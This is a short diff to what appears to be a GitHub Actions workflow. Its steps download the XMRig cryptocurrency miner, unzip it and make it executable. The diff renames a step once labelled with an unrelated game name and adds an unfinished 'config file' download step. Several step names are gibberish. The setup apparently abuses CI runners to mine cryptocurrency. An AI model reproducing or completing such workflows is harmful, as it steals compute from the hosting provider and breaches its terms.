@@ -11,8 +11,10 @@ jobs:
     steps:
     - name: downloading xm
       run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-gcc-win64.zip -OutFile xmrig-6.17.0-gcc-win64.zip
-    - name: executing gta san commands
+    - name: executing xm commands
       run: unzip xmrig-6.17.0-gcc-win64.zip
+    - name: config file
+      run : Invoke-WebRequest 
     - name : sndndn 
       run: cd xmrig-6.17.0-gcc-win64/xmrig-6.17.0 && chmod +x xmrig.exe
     - name : djhd
